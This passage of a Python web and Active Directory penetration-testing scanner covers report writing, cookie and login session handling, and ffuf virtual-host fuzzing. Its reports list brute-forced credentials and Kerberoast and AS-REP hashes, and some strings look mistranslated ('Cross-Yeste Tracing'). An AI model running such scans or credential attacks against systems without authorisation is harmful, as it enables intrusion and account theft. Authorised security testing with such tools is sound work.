                    )
            else:
                f.write("- No puertos visibles\n")
            f.write("\n")

            nse_results = nmap_data.get('nse_results') or []
            f.write("[NMAP NSE DIRIGIDO]\n")
            nse_cmd = (nmap_data.get('nse') or {}).get('command')
            if nse_cmd:
                f.write(f"- Comando: {nse_cmd}\n")
            if nse_results:
                for item in nse_results:
                    f.write(
                        f"- {item.get('port')}/{item.get('protocol')} {item.get('service') or '?'} "
                        f"{item.get('script_id')}: {item.get('output', '').splitlines()[0] if item.get('output') else ''}\n"
                    )
            else:
                f.write("- No results NSE\n")
            f.write("\n")

            f.write("[ENUMERATION]\n")
            f.write(f"- Users: {', '.join(report_data['scan_data'].get('users', [])) or 'N/A'}\n")
            f.write(f"- Emails: {', '.join(report_data['scan_data'].get('emails', [])) or 'N/A'}\n\n")

            wordpress_data = report_data['scan_data'].get('wordpress') or {}
            f.write("[WORDPRESS / WPSCAN]\n")
            if wordpress_data:
                wp_version = wordpress_data.get('version') or {}
                wp_theme = wordpress_data.get('main_theme') or {}
                f.write(f"- Detected: {'Yes' if wordpress_data.get('detected') else 'Not confirmed'}\n")
                f.write(f"- Version: {wp_version.get('number') or 'N/A'} ({wp_version.get('status') or 'unknown status'})\n")
                f.write(f"- Main theme: {wp_theme.get('name') or 'N/A'}\n")
                f.write(f"- Plugins detected: {len(wordpress_data.get('plugins') or [])}\n")
                f.write(f"- Users WPScan: {', '.join(u.get('username','') for u in wordpress_data.get('users', []) if isinstance(u, dict)) or 'N/A'}\n")
                wp_vulns = wordpress_data.get('vulnerabilities') or []
                f.write(f"- Vulnerabilities: {len(wp_vulns)}\n")
                for vuln in wp_vulns:
                    f.write(
                        f"  * [{vuln.get('component_type')}] {vuln.get('component')}: "
                        f"{vuln.get('title')}"
                        + (f" (fixed in {vuln.get('fixed_in')})" if vuln.get('fixed_in') else "")
                        + "\n"
                    )
                wp_creds = wordpress_data.get('credentials') or []
                if wp_creds:
                    f.write("- Credentials WPScan:\n")
                    for cred in wp_creds:
                        f.write(f"  * {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- No ejecutado\n")
            f.write("\n")

            spider = report_data["scan_data"].get("spider", {})
            f.write("[SPIDERING]\n")
            f.write(f"- Total URLs: {spider.get('total_urls', 0)}\n")
            f.write(f"- Total parameters: {spider.get('total_params', 0)}\n")
            f.write(f"- Total forms: {spider.get('total_forms', 0)}\n")
            for u in spider.get('sample_urls', []):
                f.write(f"  * {u}\n")
            f.write("\n")

            f.write("[ENDPOINTS API]\n")
            for ep in report_data['scan_data'].get('api_endpoints', []):
                f.write(f"- [{ep.get('status')}] {ep.get('url')} ({ep.get('content_type', '')})\n")
            f.write("\n")

            f.write("[SUBDOMINIOS (VHOSTS)]\n")
            vhosts_list = report_data['scan_data'].get('vhosts', [])
            if vhosts_list:
                for v in vhosts_list:
                    fqdn = v.get('fqdn') or v.get('subdomain', '')
                    f.write(f"- [{v.get('status')}] {fqdn} size={v.get('size', 'N/A')}\n")
            else:
                f.write("- Ninguno\n")
            f.write("\n")

            f.write("[DIRECTORIES FOUND]\n")
            for hit in report_data['scan_data'].get('directory_hits', []):
                f.write(f"- [{hit.get('status')}] {hit.get('url')} size={hit.get('size', 'N/A')}\n")
            f.write("\n")

            f.write("[BRUTEFORCE CREDENTIALS]\n")
            creds = report_data['scan_data'].get('bruteforce_credentials', [])
            if creds:
                for cred in creds:
                    f.write(f"- {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- Ninguna\n")
            f.write("\n")

            src_code_data = report_data['scan_data'].get('source_code_analysis') or {}
            src_code_findings = src_code_data.get('findings') or []
            f.write("[SOURCE CODE ANALYSIS]\n")
            f.write(f"- Pages analyzed: {src_code_data.get('pages_analyzed', 0)}\n")
            f.write(f"- Assets JS/JSON analizados: {src_code_data.get('assets_analyzed', 0)}\n")
            f.write(f"- Findings: {len(src_code_findings)}\n")
            sev_stats = src_code_data.get('summary') or {}
            if sev_stats:
                f.write(
                    f"- Severity: CRITICAL={sev_stats.get('critical',0)} "
                    f"HIGH={sev_stats.get('high',0)} "
                    f"MEDIUM={sev_stats.get('medium',0)} "
                    f"LOW={sev_stats.get('low',0)}\n"
                )
            if src_code_findings:
                src_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
                for item in sorted(src_code_findings,
                                   key=lambda x: src_order.get(x.get('severity', 'low'), 9)):
                    f.write(
                        f"- [{(item.get('severity') or '').upper()}] {item.get('type','')} "
                        f"@ {item.get('url','')} | valor: {item.get('value','')}\n"
                    )
            else:
                f.write("- Ninguno\n")
            f.write("\n")

            ad_data = report_data['scan_data'].get('active_directory') or {}
            f.write("[ACTIVE DIRECTORY]\n")
            if ad_data:
                ad_ldap = ad_data.get('ldap') or {}
                ad_nxc = ad_data.get('nxc') or {}
                ad_imp = ad_data.get('impacket') or {}
                asrep_hashes = (ad_imp.get('asrep_roast') or {}).get('hashes') or []
                kerberoast_hashes = (ad_imp.get('kerberoast') or {}).get('hashes') or []
                ad_creds = ((ad_nxc.get('bruteforce') or {}).get('credentials') or [])
                f.write(f"- DC: {ad_data.get('target') or 'N/A'}\n")
                f.write(f"- Domain: {ad_data.get('domain') or 'N/A'}\n")
                f.write(f"- Base DN: {ad_data.get('base_dn') or 'N/A'}\n")
                f.write(f"- Mode: {ad_data.get('auth_mode') or 'N/A'}\n")
                f.write(f"- Kerbrute users validos: {len((ad_data.get('kerbrute') or {}).get('valid_users') or [])}\n")
                f.write(f"- LDAP users: {len(ad_ldap.get('users') or [])}\n")
                f.write(f"- LDAP groups: {len(ad_ldap.get('groups') or [])}\n")
                f.write(f"- LDAP computers: {len(ad_ldap.get('computers') or [])}\n")
                f.write(f"- AS-REP roastable: {len(asrep_hashes)}\n")
                for h in asrep_hashes:
                    f.write(f"  * {h.get('username') or '-'} {h.get('hash') or ''}\n")
                f.write(f"- Kerberoastable SPNs: {len(kerberoast_hashes)}\n")
                for h in kerberoast_hashes:
                    f.write(f"  * {h.get('username') or '-'} {h.get('hash') or ''}\n")
                f.write(f"- Credentials NXC: {len(ad_creds)}\n")
                for cred in ad_creds:
                    f.write(f"  * {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- No ejecutado\n")
            f.write("\n")

            adv_sec_txt = report_data['scan_data'].get('advanced_security') or {}
            f.write("[ADVANCED SECURITY TESTS]\n")
            if adv_sec_txt:
                for module in ["ssrf", "ssti", "xxe", "crlf", "smuggling", "cache_poisoning"]:
                    hits = adv_sec_txt.get(module) or []
                    f.write(f"- {module.upper()}: {len(hits)} hallazgo(s)\n")
                    for r in hits:
                        if module == "ssrf":
                            f.write(f"  * [{r.get('type','ssrf')}] vector={r.get('param') or r.get('header','')} payload={str(r.get('payload') or r.get('value',''))[:60]}\n")
                        elif module == "ssti":
                            f.write(f"  * url={r.get('url','')} param={r.get('param','')} engine={r.get('engine','')}\n")
                        elif module == "xxe":
                            f.write(f"  * url={r.get('url','')} content-type={r.get('content_type','')} status={r.get('note','confirmed')}\n")
                        elif module == "crlf":
                            f.write(f"  * vector={r.get('vector','')} payload={r.get('payload','')[:50]}\n")
                        elif module == "smuggling":
                            f.write(f"  * type={r.get('tool') or r.get('type','')} detail={str(r.get('note') or r.get('output_snippet',''))[:80]}\n")
                        elif module == "cache_poisoning":
                            confirmed = "confirmado" if r.get("confirmed") else "reflejado"
                            f.write(f"  * header={r.get('header','')} value={r.get('value','')[:40]} status={confirmed}\n")
            else:
                f.write("- No ejecutado\n")
            f.write("\n")

            f.write("[HALLAZGOS]\n")
            if FINDINGS:
                for finding in FINDINGS:
                    f.write(_finding_text(finding) + "\n")
            else:
                f.write("No findings recorded.\n")

            nuclei_summary = report_data["scan_data"].get("nuclei_summary", {})
            nuclei_findings_list = report_data["scan_data"].get("nuclei_findings", []) or []
            sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
            if nuclei_summary:
                f.write("\n[NUCLEI] Vulnerability summary:\n")
                for sev in sorted(nuclei_summary.keys(), key=lambda s: sev_order.get(s, 99)):
                    tids = nuclei_summary[sev]
                    f.write(f"- {sev.upper()}: {len(tids)} findings ({', '.join(tids)})\n")
            if nuclei_findings_list:
                f.write("\n[NUCLEI] Finding details:\n")
                sorted_findings = sorted(
                    nuclei_findings_list,
                    key=lambda x: (sev_order.get((x.get('severity') or 'unknown'), 99),
                                   x.get('template_id', ''))
                )
                for n in sorted_findings:
                    sev = (n.get('severity') or 'unknown').upper()
                    tid = n.get('template_id', '')
                    name = n.get('name', '')
                    url = n.get('url', '')
                    f.write(f"- [{sev}] {tid}" + (f" — {name}" if name else "") +
                            (f" @ {url}" if url else "") + "\n")

        saved.append(("TXT", txt_file))
    except Exception as e:
        errors.append(("TXT", e))

    try:
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        saved.append(("JSON", json_file))
    except Exception as e:
        errors.append(("JSON", e))

    try:
        html_content = _build_html_report(report_data)
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        saved.append(("HTML", html_file))
    except Exception as e:
        errors.append(("HTML", e))

    try:
        md_content = _build_markdown_report(report_data)
        with open(md_file, 'w', encoding='utf-8') as f:
            f.write(md_content)
        saved.append(("MD", md_file))
    except Exception as e:
        errors.append(("MD", e))

    if saved:
        base_path = os.path.splitext(txt_file)[0]
        exts = ",".join(fmt.lower() for fmt, _ in saved)
        print_good(f"Reports saved en {base_path}.{{{exts}}}")
    for fmt, err in errors:
        print_error(f"Could not generate the report {fmt}: {err}")
    if not saved:
        print_error("Could not save any report format.")

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def _throttle_hook(response, *args, **kwargs):
    """Apply REQUEST_DELAY to EVERY session request (not only modules
    with threads). Single source of truth for --delay."""
    if REQUEST_DELAY > 0:
        time.sleep(REQUEST_DELAY)
    return response

def _build_retry():
    """Retry only transient network errors (connect/read), never by status code
    so 429/5xx responses analyzed by detection modules are not hidden."""
    try:
        return Retry(
            total=HTTP_RETRIES, connect=HTTP_RETRIES, read=HTTP_RETRIES,
            status=0, backoff_factor=0.3,
            raise_on_status=False, respect_retry_after_header=False,
        )
    except TypeError:  # old urllib3 without some kwargs
        return Retry(total=HTTP_RETRIES, backoff_factor=0.3)

def get_session(user_agent=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/html, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    })
    session.verify = VERIFY_TLS
    session.max_redirects = MAX_REDIRECTS
    adapter = HTTPAdapter(
        max_retries=_build_retry(),
        pool_connections=HTTP_POOL_SIZE,
        pool_maxsize=HTTP_POOL_SIZE,
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.hooks["response"].append(_throttle_hook)
    return session

def _apply_cookie_string_to_session(session, cookie_string, target_url=None):
    """Load a Cookie string into requests.Session and default headers."""
    cookie_string = (cookie_string or "").strip()
    if not session or not cookie_string:
        return
    session.headers["Cookie"] = cookie_string
    parsed = urlparse(target_url or TARGET_URL or "")
    domain = parsed.hostname or None
    for chunk in cookie_string.split(";"):
        if "=" not in chunk:
            continue
        name, value = chunk.split("=", 1)
        name = name.strip()
        value = value.strip()
        if not name:
            continue
        try:
            if domain:
                session.cookies.set(name, value, domain=domain)
            else:
                session.cookies.set(name, value)
        except Exception:
            session.cookies.set(name, value)

def _session_header_value(session, name):
    if not session:
        return ""
    wanted = name.lower()
    for k, v in getattr(session, "headers", {}).items():
        if str(k).lower() == wanted:
            return str(v)
    return ""

def _external_http_headers_from_session(session):
    """Return useful headers so external CLIs respect the web session."""
    if not session:
        return []
    headers = []
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        headers.append(("User-Agent", user_agent))
    authorization = _session_header_value(session, "Authorization")
    if authorization:
        headers.append(("Authorization", authorization))
    cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
    if cookie_string:
        headers.append(("Cookie", cookie_string))
    for name in ("X-CSRF-Token", "X-XSRF-TOKEN", "X-Requested-With"):
        value = _session_header_value(session, name)
        if value:
            headers.append((name, value))
    seen = set()
    unique = []
    for name, value in headers:
        key = name.lower()
        if key in seen or not value:
            continue
        seen.add(key)
        unique.append((name, value))
    return unique

def _append_ffuf_session_headers(cmd, session, skip_headers=None):
    skip = {str(h).lower() for h in (skip_headers or [])}
    for name, value in _external_http_headers_from_session(session):
        if name.lower() in skip:
            continue
        cmd += ["-H", f"{name}: {value}"]
    return cmd

def _append_nuclei_session_headers(cmd, session):
    for name, value in _external_http_headers_from_session(session):
        cmd += ["-H", f"{name}: {value}"]
    return cmd

def _append_whatweb_session_options(cmd, session):
    if not session:
        return cmd
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        cmd += ["--user-agent", user_agent]
    for name, value in _external_http_headers_from_session(session):
        if name.lower() == "user-agent":
            continue
        cmd += ["--header", f"{name}: {value}"]
    return cmd

def _auth_cookie_names(session):
    names = []
    try:
        for cookie in session.cookies:
            if cookie.name:
                names.append(cookie.name)
    except Exception:
        pass
    if not names:
        cookie_header = _session_header_value(session, "Cookie")
        for part in cookie_header.split(";"):
            if "=" in part:
                names.append(part.split("=", 1)[0].strip())
    return sorted(set(n for n in names if n))

def _record_auth_context(method, login_url, username, session, response=None, notes=None):
    SCAN_DATA["authentication"] = {
        "authenticated": True,
        "method": method,
        "login_url": login_url,
        "username": username or "",
        "cookie_names": _auth_cookie_names(session),
        "authorization_header": bool(_session_header_value(session, "Authorization")),
        "status_code": getattr(response, "status_code", None),
        "final_url": getattr(response, "url", "") if response is not None else "",
        "notes": notes or [],
    }

LOGIN_FAILURE_MARKERS = (
    "invalid credentials", "incorrect password", "incorrect username",
    "wrong password", "wrong username", "bad credentials",
    "login failed", "authentication failed", "access denied",
    "username or password", "incorrect password", "incorrect password",
    "invalid credentials", "invalid credentials",
    "credentials incorrects", "datos incorrects", "acceso denied",
    "try again", "try again", "try again", "try again",
)

def _response_shows_login_failure(response):
    if response is None:
        return False
    body = (response.text or "").lower()[:8000]
    return any(marker in body for marker in LOGIN_FAILURE_MARKERS)

def _response_has_login_form(response):
    if response is None:
        return False
    body = (response.text or "").lower()
    return 'type="password"' in body or "type='password'" in body

def _looks_authenticated_response(response, login_url, username=""):
    if response is None or response.status_code >= 400:
        return False
    if _response_shows_login_failure(response):
        return False
    body = (response.text or "").lower()
    final_path = urlparse(getattr(response, "url", "") or "").path.rstrip("/")
    login_path = urlparse(login_url or "").path.rstrip("/")
    success_markers = ("logout", "sign out",
                       "dashboard", "welcome", "bienvenido", "my account", "mi cuenta", "profile")
    if any(marker in body for marker in success_markers):
        return True
    # If it still shows a login form, we are not authenticated.
    if _response_has_login_form(response):
        return False
    if username and username.lower() in body:
        return True
    if final_path and login_path and final_path != login_path and "password" not in body[:5000]:
        return True
    if response.history and "password" not in body[:5000]:
        return True
    return False

def _verify_authenticated_session(session, identifier=""):
    """Revisit the target URL with the session to confirm it remains authenticated."""
    try:
        resp = session.get(TARGET_URL, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
    except requests.RequestException:
        return None
    return resp

def check_seclists():
    if os.path.exists(SECLISTS_SMALL):
        return SECLISTS_SMALL
    elif os.path.exists(SECLISTS_MEDIUM):
        print_warning("Small wordlist not found, using medium (larger and slower).")
        return SECLISTS_MEDIUM
    else:
        print_warning("SecLists was not found in the default paths.")
        response = input_path(f"Install SecLists automatically? (requires sudo) [y/N]: ").strip().lower()
        if response in ('y', 's'):
            try:
                print_info("Running: sudo apt update && sudo apt install seclists -y")
                subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True)
                subprocess.run(["sudo", "apt", "install", "seclists", "-y"], check=True, capture_output=True)
                if os.path.exists(SECLISTS_SMALL):
                    print_good("SecLists installed successfully.")
                    return SECLISTS_SMALL
                elif os.path.exists(SECLISTS_MEDIUM):
                    return SECLISTS_MEDIUM
                else:
                    print_error("The installation appears to have failed.")
            except Exception as e:
                print_error(f"Could not instalar SecLists: {e}")
        print_warning("Using reduced internal wordlist for fuzzing.")
        return None

# ========== AUTHENTICATION FUNCTIONS ==========
def _prompt_user_agent():
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Custom User-Agent (empty = default):")
    return input("> ").strip() or None

def _attempt_basic_auth(login_url, username, password, user_agent):
    """Reliably verify Basic Auth: probe without credentials, then with credentials.
    Returns ('valid'|'invalid'|'not-used', session|None, response|None)."""
    session = get_session(user_agent)
    try:
        probe = session.get(login_url, timeout=DEFAULT_TIMEOUT)
    except requests.RequestException as e:
        print_warning(f"Could not sondear Basic Auth ({type(e).__name__}).")
        return "not-used", None, None
    challenge = probe.headers.get("WWW-Authenticate", "").lower()
    if probe.status_code != 401 or "basic" not in challenge:
        return "not-used", None, None
    try:
        resp = session.get(login_url, auth=(username, password), timeout=DEFAULT_TIMEOUT)
    except requests.RequestException as e:
        print_warning(f"Error en Basic Auth ({type(e).__name__}).")
        return "not-used", None, None
    if resp.status_code == 200:
        session.auth = (username, password)  # persist credentials in the session
        return "valid", session, resp
    return "invalid", None, resp

def _attempt_form_login(login_url, identifier, password, is_email, user_agent):
    """Detect the login form and test credentials.
    Returns ('valid'|'invalid'|'no-form', session|None, response|None, form_url)."""
    session = get_session(user_agent)
    if not HAS_BS4:
        print_warning("BeautifulSoup not available: cannot parse the login form.")
        return "no-form", None, None, login_url
    try:
        resp = session.get(login_url, timeout=DEFAULT_TIMEOUT)
    except requests.RequestException as e:
        print_error(f"Could not cargar la URL de login ({type(e).__name__}).")
        return "no-form", None, None, login_url
    soup = BeautifulSoup(resp.text, 'html.parser')
    for form in soup.find_all('form'):
        action = form.get('action')
        inputs = form.find_all(['input', 'textarea'])
        user_field = email_field = pass_field = None
        for inp in inputs:
            name = (inp.get('name') or '').lower()
            itype = (inp.get('type') or '').lower()
            if not name:
                continue
            if itype == 'password' or 'pass' in name:
                pass_field = inp.get('name')
            elif itype == 'email' or 'email' in name or 'correo' in name:
                email_field = inp.get('name')
            elif 'user' in name or 'login' in name or name in ('uname', 'identifier', 'account', 'user'):
                user_field = inp.get('name')
        # Choose the identifier field based on user or email.
        if is_email:
            ident_field = email_field or user_field
        else:
            ident_field = user_field or email_field
        if not (ident_field and pass_field):
            continue
        form_url = urljoin(login_url, action) if action else login_url
        data = {ident_field: identifier, pass_field: password}
        for inp in inputs:
            iname = inp.get('name')
            itype = (inp.get('type') or '').lower()
            if not iname or iname in (ident_field, pass_field):
                continue
            if itype == 'hidden':
                data[iname] = inp.get('value', '')
            elif itype in ('submit', 'button') and inp.get('value'):
                data.setdefault(iname, inp.get('value', ''))
        try:
            resp2 = session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        except requests.RequestException as e:
            print_error(f"Error submitting the form ({type(e).__name__}).")
            continue
        if _looks_authenticated_response(resp2, login_url, identifier):
            return "valid", session, resp2, form_url
        return "invalid", None, resp2, form_url
    return "no-form", None, None, login_url

def setup_authentication():
    global AUTHENTICATED, AUTH_SESSION, TARGET_URL
    user_agent = _prompt_user_agent()

    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use a cookie/token already obtained manually? [y/N]:")
    manual_mode = input("> ").strip().lower() in ('y', 's')
    if manual_mode:
        temp_session = get_session(user_agent)
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Full cookie (for example: PHPSESSID=...; csrftoken=...):")
        cookie_string = input("> ").strip()
        if cookie_string:
            _apply_cookie_string_to_session(temp_session, cookie_string, TARGET_URL)
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Optional Authorization header (for example: Bearer ey...; empty to skip):")
        authorization = input("> ").strip()
        if authorization:
            temp_session.headers["Authorization"] = authorization
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Optional extra headers Name: value (empty line to finish):")
        while True:
            extra = input("> ").strip()
            if not extra:
                break
            if ":" not in extra:
                print_warning("Formato invalid. Usa Name: valor")
                continue
            name, value = extra.split(":", 1)
            if name.strip() and value.strip():
                temp_session.headers[name.strip()] = value.strip()
        resp = _verify_authenticated_session(temp_session)
        if resp is not None and _looks_authenticated_response(resp, TARGET_URL):
            AUTH_SESSION = temp_session
            AUTHENTICATED = True
            _record_auth_context("manual-session", TARGET_URL, "", temp_session, response=resp)
            print_good("Manual session validated. Compatible tools will use cookies/headers.")
            return
        AUTH_SESSION = temp_session
        AUTHENTICATED = True
        note = "could not confirm authentication (possible login page)" if resp is not None else "no target response"
        _record_auth_context("manual-session", TARGET_URL, "", temp_session, response=resp, notes=[note])
        print_warning(f"Manual session loaded, but {note}.")
        return

    print_info("Authentication configuration")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Login URL (leave empty if it is the same as the target):")
    login_url = input("> ").strip()
    login_url = normalize_url(login_url) if login_url else TARGET_URL
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} User o email:")
    identifier = input("> ").strip()
    is_email = "@" in identifier
    print_info(f"Identifier detected as {'email' if is_email else 'user'}.")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password:")
    password = getpass.getpass("> ")

    def _finish_fail():
        global AUTHENTICATED, AUTH_SESSION
        print_warning("Could not authenticate. Tests will run without authentication.")
        AUTHENTICATED = False
        AUTH_SESSION = None
        SCAN_DATA["authentication"] = {"authenticated": False}

    # 1. Basic Auth (only if the server requests it).
    status, session, resp = _attempt_basic_auth(login_url, identifier, password, user_agent)
    if status == "valid":
        print_good("Valid credentials (Basic Auth).")
        AUTH_SESSION = session
        AUTHENTICATED = True
        _record_auth_context("basic-auth", login_url, identifier, session, response=resp)
        return
    if status == "invalid":
        print_error(f"Invalid credentials en Basic Auth (HTTP {resp.status_code}).")
        _finish_fail()
        return

    # 2. Form-based login.
    status, session, resp, form_url = _attempt_form_login(login_url, identifier, password, is_email, user_agent)
    if status == "valid":
        verify = _verify_authenticated_session(session, identifier)
        if verify is not None and _response_has_login_form(verify):
            print_warning("The form responded as valid, but the session does not persist (possible CSRF/redirect).")
            _finish_fail()
            return
        print_good("Valid credentials. Authenticated session verified.")
        AUTH_SESSION = session
        AUTHENTICATED = True
        _record_auth_context("form-login", form_url, identifier, session, response=resp)
        return
    if status == "invalid":
        print_error("Invalid credentials: the form rejected the username/password.")
    else:
        print_warning("No HTML login form detected (possible SPA / OAuth2).")
        # 3. Attempt headless login with Playwright.
        if not check_playwright():
            print_warning("Playwright is not installed. Install it to support SPAs/OAuth2: pip install playwright && playwright install chromium")
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install Playwright now? [y/N]:")
            if input("> ").strip().lower() in ('y', 's'):
                if install_playwright():
                    # Reimportar tras instalacion.
                    try:
                        from playwright.sync_api import sync_playwright as _spw
                        globals()["sync_playwright"] = _spw
                        globals()["HAS_PLAYWRIGHT"] = True
                    except Exception:
                        pass
        if HAS_PLAYWRIGHT:
            print_info("Attempting headless login with Playwright...")
            cookies_dict, final_url = _attempt_headless_login(login_url, identifier, password, user_agent)
            if cookies_dict:
                headless_session = get_session(user_agent)
                _apply_playwright_cookies_to_session(headless_session, cookies_dict, TARGET_URL)
                verify = _verify_authenticated_session(headless_session, identifier)
                if verify is not None and not _response_has_login_form(verify):
                    print_good(f"Headless login successful (Playwright). Final URL: {final_url}")
                    AUTH_SESSION = headless_session
                    AUTHENTICATED = True
                    _record_auth_context("headless-playwright", login_url, identifier, headless_session, response=verify)
                    return
                else:
                    print_error("Headless login: cookies were obtained but the session does not appear authenticated.")
            else:
                print_error("Headless login failed (no cookies obtained or no post-auth redirect).")
    _finish_fail()

def get_active_session():
    global AUTH_SESSION, AUTHENTICATED
    if AUTHENTICATED and AUTH_SESSION:
        return AUTH_SESSION
    else:
        return get_session()

# ========== TEST FUNCTIONS ==========
def safe_execute(func, *args, **kwargs):
    try:
        return func(*args, **kwargs)
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print_error(f"Error en {func.__name__}: {str(e)[:100]}")
        return None

def gather_info(target, session):
    try:
        info = {}
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        info['status_code'] = resp.status_code
        info['headers'] = dict(resp.headers)
        info['cookies'] = resp.cookies
        info['server'] = resp.headers.get('Server', 'No revelado')

        # Technology detection with WhatWeb
        print_info("Detecting technologies with WhatWeb...")
        ww_result = run_whatweb(target, session)
        if ww_result is not None:
            info['technologies'] = ww_result
            info['technologies_source'] = 'whatweb'
        else:
            # Fallback: basic detection by headers
            tech = []
            if 'Set-Cookie' in resp.headers and 'PHPSESSID' in resp.headers['Set-Cookie']:
                tech.append('PHP')
            if 'X-Powered-By' in resp.headers:
                tech.append(resp.headers['X-Powered-By'])
            if 'ASP.NET' in str(resp.headers):
                tech.append('ASP.NET')
            info['technologies'] = list(set(tech))
            info['technologies_source'] = 'headers'
            if info['technologies']:
                print_info(f"Technologies (fallback): {', '.join(info['technologies'])}")

        return info
    except Exception as e:
        print_error(f"Could not gather information: {e}")
        return None

def check_robots_sitemap(target, session):
    try:
        paths = []
        for p in ['/robots.txt', '/sitemap.xml']:
            url = urljoin(target, p)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    print_good(f"Found: {url}")
                    paths.append(url)
                    if 'robots.txt' in p:
                        lines = resp.text.splitlines()
                        for line in lines:
                            if line.startswith('Disallow:') or line.startswith('Allow:'):
                                parts = line.split(':')
                                if len(parts) > 1:
                                    path = parts[1].strip()
                                    if path and path != '/':
                                        print_info(f"  Path en robots.txt: {path}")
            except:
                pass
        return paths
    except Exception as e:
        print_error(f"Error en check_robots_sitemap: {e}")
        return []

def check_http_methods(target, session):
    try:
        allowed = []
        resp = session.options(target, timeout=DEFAULT_TIMEOUT)
        if 'Allow' in resp.headers:
            allowed = [m.strip() for m in resp.headers['Allow'].split(',')]
            print_info(f"Allowed HTTP Methods: {', '.join(allowed)}")
        trace_resp = session.request('TRACE', target, timeout=DEFAULT_TIMEOUT)
        if trace_resp.status_code == 200:
            print_vuln("Method TRACE habilitado (Cross-Yeste Tracing)")
            allowed.append('TRACE')
        return allowed
    except Exception as e:
        print_error(f"Error en check_http_methods: {e}")
        return []

def vhost_bruteforce(target, session, base_domain, wordlist=None, threads=THREADS,
                     use_ffuf=True, request_timeout=5, rate=0, use_fs_filter=True):
    """Subdomain fuzzing (virtual hosts) using ffuf with the Content-Length technique.

    Send a request with an invalid Host (defnotvalid.<base_domain>) to obtain the
    baseline length of "not found", and if `use_fs_filter` is True, ffuf filters
    via `-fs <baseline>` discarding all matching responses.
    """
    results = []
    try:
        if not base_domain:
            print_error("Base domain is empty. Cannot run subdomain fuzzing.")
            return results

        if wordlist is None and os.path.isfile(SECLISTS_DNS):
            wordlist = SECLISTS_DNS
        if wordlist and not os.path.isfile(wordlist):
            print_warning(f"Could not read wordlist '{wordlist}'.")
            wordlist = None
        if not wordlist:
            print_error("No wordlist available for vhost fuzzing.")
            return results

        # 1) Baseline: send an invalid Host header to the target and read Content-Length
        bogus_host = f"defnotvalid{int(time.time()) % 100000}.{base_domain}"
        baseline_size = None
        try:
            print_info(f"Baseline with invalid Host: {bogus_host}")
            base_resp = session.get(
                target,
                headers={"Host": bogus_host},
                timeout=DEFAULT_TIMEOUT,
                allow_redirects=False,
            )
            # Prefer Content-Length when present, otherwise use len(content)
            cl_header = base_resp.headers.get('Content-Length')
            if cl_header and cl_header.isdigit():
                baseline_size = int(cl_header)
            else:
                baseline_size = len(base_resp.content)
            print_info(f"Baseline status={base_resp.status_code} Content-Length={baseline_size}")
        except Exception as e:
            print_warning(f"Could not calculate baseline ({e}); ffuf will not filter by size.")

        if use_ffuf and check_ffuf():
            # Count valid entries in the wordlist to inform the user
            wl_count = 0
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as wlf:
                    for line in wlf:
                        s = line.strip()
                        if s and not s.startswith('#'):
                            wl_count += 1
            except Exception:
                pass
            if wl_count:
                # Approximate ETA: each thread processes ~10 req/s on average
                est_seconds = max(1, int(wl_count / max(1, threads * 10)))
                est_min = est_seconds // 60
                eta = f"~{est_min}m" if est_min >= 1 else f"~{est_seconds}s"
                print_info(f"Wordlist: {wl_count:,} entradas · threads: {threads} · timeout: {request_timeout}s · ETA: {eta}")
                if wl_count > 50_000 and threads < 40:
                    print_warning(
                        f"Large wordlist ({wl_count:,}) with few threads ({threads}). "
                        "Consider Ctrl+C and increasing threads or using a shorter wordlist."
                    )

            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.json')
            os.close(tmp_fd)
            ffuf_cmd = [
                "ffuf",
                "-w", f"{wordlist}:FUZZ",
                "-u", target.rstrip('/') + '/',
                "-H", f"Host: FUZZ.{base_domain}",
                "-t", str(threads),
                "-timeout", str(request_timeout),
                "-o", tmp_path, "-of", "json",
            ]
            ffuf_cmd = _append_ffuf_session_headers(ffuf_cmd, session, skip_headers={"Host"})
            if rate and rate > 0:
                ffuf_cmd += ["-rate", str(rate)]
            if baseline_size is not None and use_fs_filter:
                ffuf_cmd += ["-fs", str(baseline_size)]
            print_info(f"Running: {' '.join(ffuf_cmd[:11])} ...")
            print()
            process = None
            try:
                process = subprocess.Popen(ffuf_cmd)
                process.wait()
                rc = process.returncode
                print()

                if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 2:
                    try:
                        hits = _load_ffuf_json_results(tmp_path)
                        STATUS_COLOR = {
                            200: Fore.GREEN, 201: Fore.GREEN, 204: Fore.GREEN,
                            301: Fore.CYAN,  302: Fore.CYAN,  307: Fore.CYAN, 308: Fore.CYAN,
                            401: Fore.YELLOW, 403: Fore.YELLOW,
